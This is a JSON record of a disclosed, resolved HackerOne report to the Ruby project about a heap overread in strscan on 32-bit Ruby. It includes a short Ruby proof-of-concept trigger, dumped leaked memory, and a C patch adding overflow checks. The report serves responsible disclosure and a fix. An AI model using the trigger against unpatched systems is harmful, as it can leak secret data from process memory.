@@ -1,0 +1,116 @@
+{
+  "id": 166661,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjY2NjE=",
+  "url": "https://hackerone.com/reports/166661",
+  "title": "Arbitrary heap overread in strscan on 32 bit Ruby, patch included",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2016-09-07T20:12:07.163Z",
+  "submitted_at": "2016-09-07T20:12:07.163Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "guido",
+    "url": "/guido",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-11-17T00:30:21.494Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-11-16T10:08:50.689Z",
+  "team_member_agreed_on_going_public_at": "2016-11-17T00:30:21.452Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "```ruby\nrequire 'strscan'\nx = 'x' * 0x7FFFFFFE\ns = StringScanner.new(x)\ns.pos = 0x7FFFFFFD\nt = s.peek(40000)\nt.each_byte do |i|\n\tif i != 0\n\t\tprint i.chr\n\tend\nend\n```\n\nRun:\n\n```sh\n./ruby r.rb | strings\n```\n\nMy output:\n\n```\n@\t;>@V`TdBE\n__gmon_start___fini_ITM_deregisterTMCloneTable_ITM_registerTMCloneTable__cxa_finalize_Jv_RegisterClassesonig_region_memsizeonig_region_freeruby_xfreerb_gc_markrb_check_typeddatarb_num2longrb_eRangeErrorrb_raiserb_int2bigrb_eArgErrorrb_string_valuerb_reg_region_copyrb_memerrorrb_scan_argsrb_data_typed_object_zalloconig_region_initrb_str_newrb_str_dumprb_str_new_staticrb_str_catrb_funcallrb_str_lengthrb_str_appendrb_warningrb_enc_copyrb_sym2strrb_enc_getonig_name_to_backref_numberrb_eIndexErrorrb_enc_raiseonig_region_clearonig_region_setrb_enc_mbclenrb_check_typerb_reg_prepare_reonig_matchonig_freeonig_searchrb_obj_classrb_sprintfInit_strscanrb_cObjectrb_define_classrb_eStandardErrorrb_define_class_underrb_const_definedrb_obj_freezerb_const_setrb_define_alloc_funcrb_define_private_methodrb_define_singleton_methodrb_define_methodrb_intern2rb_aliaslibpthread.so.0libdl.so.2libcrypt.so.1libm.so.6libc.so.6_edata__bss_start_endGLIBC_2.1.3\n@xh[\nD$ P\nUWVS\n[^_]\n&UWVS\n[^_]\nt&WVS\nt&VS\n'WVS\nD$ P\nt&UWVS\n[^_]\n;|$0|\nL$0)\n;|$0|\nL$0)\n'UWVS\nl$<P\n[^_]\n~`9G\n[^_]\nPjjW\nvWVS\nPjjW\nt&WVS\nPjjW\nvUWVS\n[^_]\nvUWVS\n|$@P\n[^_]\n'UWVS\n|$<j\n[^_]\n~$RW\nQRQU\n&UWVS\n|$<j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$<j\n[^_]\n~$RW\nQRQU\n[^_]\nUWVS\n|$<j\n[^_]\n~$RW\nRPRPU\n&UWVS\n|$<j\n[^_]\n~$RW\nRPRPU\n[^_]\n&UWVS\n|$<j\n[^_]\n~$RW\nQRQU\n'UWVS\n|$<j\n[^_]\n~$RW\nQRQU\nUWVS\n|$<j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$<j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$<j\n[^_]\n~$RW\nQRQU\nt&UWVS\n|$<P\n[^_]\n'UWVS\n[^_]\n&UWVS\n[^_]\nvWVS\n^j/P\n jPW\n [^_\nuninitialized StringScanner objectunscan failed: previous match record not existStringScanner#clear is obsolete; use #terminate insteadStringScanner#restsize is obsolete; use #rest_size insteadundefined group name reference: %.*sStringScanner#getbyte is obsolete; use #get_byte insteadStringScanner#peep is obsolete; use #peek insteadStringScanner#empty? is obsolete; use #eos? instead$Id: strscan.c 52988 2015-12-09 01:01:17Z ko1 $index out of range11...regexp buffer overflow#<%li\n (uninitialized)>#<%li\n fin>#<%li\n %ld/%ld @ %li\n>#<%li\n %ld/%ld %li\n @ %li\n>ScanErrorbytesliceStringScanner0.7.0VersionIdinitializeinitialize_copymust_C_versionresetterminateclearstringstring=concat<<pos=charpospointerpointer=skipmatch?checkscan_fullscan_untilskip_untilexist?check_untilsearch_fullgetchget_bytegetbytepeekpeepunscanbeginning_of_line?bol?eos?empty?rest?matched?matchedmatched_size[]pre_matchpost_matchrestrest_sizerestsizeinspect\n;*2$\"\n pH\tp\nvGCC: (Debian 4.9.2-10) 4.9.2\n^<\t M\nPF\tY\nH\t$M\n)d\tnW\n4,\t'b\n@\t;y\n^P\t(\n^T\t`\n^X\t]\n\\\tg2\n\t\t6%\n^<\t M\nPF\tY\nH\t$M\n)d\tnW\n4,\t'b\n@\t;y\n^P\t(\n^T\t`\n^X\t]\n\\\tg2\n\t\t6%\n```\n\nProposed patch is as follows. Note that I avoid the easy way of checking for overflow ie.\n```c\nbeg_i + len < beg_i\n```\n\nsince that implies a signed integer overflow which is officially undefined behavior in C and reportedly may lead to unexpected results on some architectures. But feel free to implement a patch however you want.\n\n```diff\ndiff --git a/ext/strscan/strscan.c b/ext/strscan/strscan.c\nindex 9b52fea..7dfe17a 100644\n--- a/ext/strscan/strscan.c\n+++ b/ext/strscan/strscan.c\n@@ -153,7 +153,7 @@ static VALUE\n extract_beg_len(struct strscanner *p, long beg_i, long len)\n {\n     if (beg_i > S_LEN(p)) return Qnil;\n-    if (beg_i + len > S_LEN(p))\n+    if (len < 0 || beg_i > (LONG_MAX - len) || beg_i + len > S_LEN(p))\n         len = S_LEN(p) - beg_i;\n     return infect(str_new(p, S_PBEG(p) + beg_i, len), p);\n }\n```\n\nNote that malice isn't necessarily required to trigger this vulnerability; any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()'d data ever leaves the system).\n\nThe vulnerability is not expected to work on 64 bit systems because of the much larger limits of the ```long``` type, and the requirement that the sizes of the buffers and available heap memory are accordingly large.\n\nTested on ruby-2.3.1 ",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-12-16T10:08:50.718Z",
+  "allow_singular_disclosure_after": -225944036.65417868,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "dirk",
+    "michiel",
+    "cuso4",
+    "supernatural",
+    "madrobot",
+    "mpz",
+    "eveeez",
+    "guido",
+    "ajdumanhug",
+    "spetr0x",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
